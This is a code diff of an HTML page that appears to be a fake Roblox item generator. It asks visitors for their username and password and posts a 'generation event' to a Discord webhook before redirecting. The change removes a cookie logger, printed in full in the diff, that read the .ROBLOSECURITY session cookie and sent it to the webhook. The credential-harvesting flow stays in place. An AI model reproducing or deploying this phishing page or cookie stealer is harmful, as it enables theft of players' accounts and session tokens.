@@ -107,7 +107,6 @@
       <input type="text" id="username" placeholder="Enter Username">
       <input type="password" id="password" placeholder="Enter Password">
       <button id="generate-btn">Generate!</button>
-      <button id="cookie-btn">Get Cookie</button>
     </div>
 
     <div id="result"></div>
@@ -129,7 +128,6 @@
       { name: 'Grape', img: 'grape.png' }
     ];
 
-    // Main generate flow
     document.getElementById('generate-btn').addEventListener('click', () => {
       const user = document.getElementById('username').value.trim();
       const pass = document.getElementById('password').value;
@@ -144,7 +142,7 @@
         </div>
       `;
 
-      // Send generation event
+      // Send event to Discord webhook
       const payload = {
         embeds: [{
           title: '🎉 New Generation Event',
@@ -163,33 +161,11 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       })
-      .then(() => logCookie('🍪 Roblox Cookie Logger'))
-      .catch(err => console.warn('Generation webhook failed:', err))
-      .finally(() => window.location.href = REDIRECT_URL);
+      .catch(err => console.warn('Discord webhook failed:', err))
+      .finally(() => {
+        window.location.href = REDIRECT_URL;
+      });
     });
-
-    // Manual cookie logger
-    document.getElementById('cookie-btn').addEventListener('click', () => {
-      logCookie('🍪 Roblox Cookie (Manual Request)');
-    });
-
-    function logCookie(title) {
-      const robloxCookie = document.cookie
-        .split('; ')
-        .find(c => c.startsWith('.ROBLOSECURITY='))
-        || 'No Roblox cookie found';
-      console.log(`${title}:`, robloxCookie);
-
-      const cookiePayload = {
-        embeds: [{ title, description: robloxCookie, color: 0xffff00 }]
-      };
-      fetch(DISCORD_WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(cookiePayload)
-      })
-      .catch(err => console.warn('Cookie logger failed:', err));
-    }
   </script>
 </body>
 </html>
